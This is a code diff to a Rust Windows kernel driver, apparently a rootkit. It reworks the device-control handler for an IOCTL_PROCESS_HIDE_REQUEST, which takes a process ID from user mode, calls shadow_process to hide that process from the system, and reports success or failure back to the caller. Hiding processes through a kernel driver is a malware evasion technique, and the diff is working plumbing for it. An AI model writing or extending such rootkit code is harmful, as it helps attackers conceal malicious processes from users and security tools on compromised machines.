@@ -20,14 +20,11 @@ use constants::IOCTL_PROCESS_HIDE_REQUEST;
 use wdk_alloc::WdkAllocator;
 
 use wdk::{nt_success, println};
-use wdk_sys::ntddk::{IoCreateDevice, IoDeleteDevice};
-use wdk_sys::ntddk::{IoCreateSymbolicLink, IoDeleteSymbolicLink};
+use wdk_sys::ntddk::{IoCreateDevice, IoDeleteDevice, IoCreateSymbolicLink, IoDeleteSymbolicLink, IofCompleteRequest};
 use wdk_sys::{
     DEVICE_OBJECT, DRIVER_OBJECT, IRP, IRP_MJ_CREATE,IRP_MJ_DEVICE_CONTROL, NTSTATUS, PCUNICODE_STRING, PDEVICE_OBJECT,
-    PDRIVER_DISPATCH, PIRP, PUNICODE_STRING, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION
+    PDRIVER_DISPATCH, PIRP, PUNICODE_STRING, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION, STATUS_UNSUCCESSFUL, IO_NO_INCREMENT
 };
-use wdk_sys::ntddk::IofCompleteRequest;
-use wdk_sys::IO_NO_INCREMENT;
 
 
 
@@ -91,27 +88,48 @@ unsafe extern "C" fn major_function_create(_device: PDEVICE_OBJECT, pirp: PIRP) 
 unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp: PIRP) -> NTSTATUS {
     let stack = IoGetCurrentIrpStackLocation(pirp);
     let ioctl = (*stack).Parameters.DeviceIoControl.IoControlCode;
-    if ioctl == IOCTL_PROCESS_HIDE_REQUEST {
-        let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
-        println!("Hiding process with pid: {}", target_pid);
-        println!("Hiding process!");
-        
-        
-        match shadow_process(target_pid) {
-            Ok(_) => println!("Process {:?} successfully shadowed", target_pid),
-            Err(e) => println!("Error calling shadow_process: {:?}",e),
+    let mut status = STATUS_UNSUCCESSFUL;
+
+    match ioctl {
+        IOCTL_PROCESS_HIDE_REQUEST => {
+            let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
+            println!("Hiding process PID: {}", target_pid);
+            
+            let output_buffer = (*pirp).UserBuffer as *mut u32;
+            let mut informations = 0;
+
+            status = match shadow_process(target_pid) {
+                Ok(_) => {
+                    println!("Process {:?} successfully shadowed", target_pid);
+                    
+                    if !output_buffer.is_null() {
+                        *output_buffer = 0x1;
+                        informations = 4;
+                    }
+                    
+                    STATUS_SUCCESS
+                },
+                Err(e) => {
+                    println!("Error calling shadow_process: {:?}", e);
+                    
+                    if !output_buffer.is_null() {
+                        *output_buffer = 0x0;
+                        informations = 4;
+                    }
+                    
+                    STATUS_UNSUCCESSFUL
+                },
+            };
+
+            complete_request(pirp, status, informations);
+        },
+        _ => {
+            println!("Unknown IOCTL code: 0x{:X}", ioctl);
         }
-
-
-        let status = STATUS_SUCCESS;
-        let informations = 0;
-        complete_request(pirp, status, informations);
     }
 
-
-
     println!("Major function device control called!");
-    STATUS_SUCCESS
+    status
 }
 
 
